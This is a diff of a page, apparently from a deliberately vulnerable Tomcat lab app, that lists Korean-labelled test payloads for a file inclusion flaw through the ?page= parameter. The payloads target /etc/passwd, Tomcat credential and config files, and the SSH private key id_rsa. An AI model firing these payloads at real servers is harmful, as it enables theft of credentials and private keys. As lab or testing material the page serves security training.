@@ -39,11 +39,11 @@
 <h3>테스트 페이로드</h3>
 <pre>
 시스템 파일:     ?page=/etc/passwd
-Tomcat 설정:    ?page=/home/yuyu/tomcat/conf/server.xml
-Tomcat 유저:    ?page=/home/yuyu/tomcat/conf/tomcat-users.xml
-앱 소스코드:    ?page=/home/yuyu/tomcat/webapps/vuln/WEB-INF/web.xml
-Apache 설정:    ?page=/home/yuyu/httpd-2.4.66/conf/httpd.conf
-SSH 키:         ?page=/home/yuyu/.ssh/id_rsa
+Tomcat 설정:    ?page=/opt/tomcat/conf/server.xml
+Tomcat 유저:    ?page=/opt/tomcat/conf/tomcat-users.xml
+앱 소스코드:    ?page=/opt/tomcat/webapps/vuln/WEB-INF/web.xml
+Apache 설정:    ?page=/opt/httpd-2.4.66/conf/httpd.conf
+SSH 키:         ?page=$HOME/.ssh/id_rsa
 </pre>
 <a href="index.jsp">← 메인</a>
 </body>
